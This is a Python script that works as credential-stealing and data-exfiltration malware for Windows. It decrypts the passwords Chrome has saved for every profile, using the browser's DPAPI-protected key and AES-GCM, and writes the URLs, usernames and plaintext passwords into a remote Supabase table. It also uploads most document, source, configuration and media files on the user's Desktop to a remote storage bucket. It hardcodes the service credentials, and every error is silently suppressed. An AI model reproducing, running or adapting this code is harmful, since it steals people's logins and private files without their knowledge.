import os
from supabase import create_client, Client
import platform
import winreg
import sqlite3
import shutil
import base64
import win32crypt
import json
from Cryptodome.Cipher import AES
import csv
import re
import random
import string

supabase_url = "https://awrsldbluxdgwcrcnbfm.supabase.co"
supabase_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF3cnNsZGJsdXhkZ3djcmNuYmZtIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMTk2NTg0NSwiZXhwIjoyMDQ3NTQxODQ1fQ.EgFHsHHjMJf7zG4M8ZaN6XpxmuJFaqId3EXEDFceA1Y"
supabase: Client = create_client(supabase_url, supabase_key)
bucket_name = "Data"
def generate_unique_identifier(length=16):
    characters = string.ascii_letters + string.digits
    unique_identifier = ''.join(random.choices(characters, k=length))
    return unique_identifier

all_extension_Files = [
    ".txt", ".log", ".md", ".rtf", ".csv", ".tsv",
    ".doc", ".docx", ".odt", ".pages", ".wpd",
    ".ppt", ".pptx", ".odp", ".key",
    ".xls", ".xlsx", ".ods", ".numbers",
    ".json", ".xml", ".yaml", ".yml", ".ini", ".toml", ".plist",
    ".html", ".htm", ".xhtml", ".svg",
    ".py", ".js", ".java", ".c", ".cpp", ".h", ".cs", ".php", ".rb", ".swift", ".go", ".rs", ".ts",
    ".conf", ".cfg", ".env", ".settings",
    ".sh", ".bat", ".cmd", ".ps1",
    ".tex", ".bib",
    ".mdown", ".markdown", ".mkd",
    ".log", ".dat",
    ".epub", ".pdf", ".srt", ".vtt"
    #===============================================================================#
    ".mp3", ".wav", ".aac", ".flac", ".ogg", ".wma", ".m4a", ".aiff", ".alac", ".opus",
    ".mp4", ".mkv", ".mov", ".avi", ".wmv", ".flv", ".webm", ".mpg", ".mpeg", ".3gp", ".m4v",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".webp", ".ico", ".heic", ".raw",
    ".svg", ".eps", ".ai", ".pdf",
    ".swf", ".fla", ".mng", ".apng",
    ".obj", ".fbx", ".dae", ".stl", ".gltf", ".glb", ".3ds",
    ".srt", ".vtt", ".ssa", ".ass",
    ".dng", ".xcf", ".psd", ".cr2", ".orf"
]
#============================================================#
#check for chrome

def is_chrome_installed():
    common_paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
    for path in common_paths:
        if os.path.isfile(path):
            return True
    try:
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
            chrome_path = winreg.QueryValue(key, None)
            if chrome_path and os.path.isfile(chrome_path):
                return True
    except FileNotFoundError:
        pass

    return False
if is_chrome_installed():
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            #(1) Get secretkey from chrome local state
            with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            #Remove suffix DPAPI
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            pass
            return None
        
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            pass
            return ""
        
    def get_db_connection(chrome_path_login_db):
        try:
            print(chrome_path_login_db)
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            pass
            return None
            

    try:
        #Create Dataframe to store passwords
        unique_Identifier = generate_unique_identifier(20)
        i=0
        CHROME_DATA_DUMP = {"==CHROME DATA DUMP=="+'\n'+
                            "URL: %s"+'\n'+
                            "User Name: %s"+'\n'+
                            "Password: %s"+'\n'+
                            "=================="+'\n'}
        file = os.path.normpath(rf"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                #(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            url = str(url)
                            username = str(username)
                            decrypted_password = str(decrypted_password)
                            supabase.table("Data").insert({"url":url,"username":username,"Password":decrypted_password}).execute()
                            
                    cursor.close()

                    conn.close()
                    
                    os.remove("Loginvault.db")
    except Exception as e:
        pass
else:
    pass
#============================================================#



# Get the path to the Desktop
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# List to store image file locations
max_file_size = 50 * 1024 * 1024
image_file_locations = []



# Walk through the desktop directory
for root, dirs, files in os.walk(desktop_path):
    for file in files:
        # Check if the file has an image extension
        if os.path.splitext(file)[1].lower() in all_extension_Files:
            file_path = os.path.join(root, file)
            image_file_locations.append(file_path)

for location in image_file_locations:
    print(location)

    if os.path.exists(location):
        file_size = os.path.getsize(location)
        if file_size <= max_file_size:
            with open(location, "rb") as file:
                file_name = os.path.basename(location)
                try:
                    supabase.storage.from_(bucket_name).upload(file_name, file)
                except:
                    print("uploaded already")
                    pass
        else:
            pass
        
